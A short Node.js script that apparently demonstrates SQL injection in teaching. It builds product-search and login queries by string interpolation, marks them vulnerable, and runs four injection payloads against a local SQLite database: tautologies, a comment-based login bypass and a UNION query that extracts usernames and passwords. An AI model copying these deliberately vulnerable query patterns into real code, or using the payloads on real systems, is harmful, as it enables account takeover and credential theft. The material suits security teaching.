const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

// VULNERABLE - using template literals (string interpolation)
function searchProduct(name) {
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log('Query:', query);
    const rows = db.prepare(query).all();
    console.log('Result:', rows, '\n');
    return rows;
}

// VULNERABLE - using template literals
function login(username, password) {
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log('Query:', query);
    const row = db.prepare(query).get();
    console.log('Result:', row, '\n');
    return row;
}

console.log(' ATTACK 1: Dump all products ');
searchProduct("' OR 1=1--");

console.log('ATTACK 2: Login bypass with no password ');
login("admin'--", "anything");

console.log('ATTACK 3: Always true login ');
login("' OR '1'='1", "' OR '1'='1");

console.log(' ATTACK 4: UNION attack to steal users ');
searchProduct("' UNION SELECT id, username, password, role FROM users--");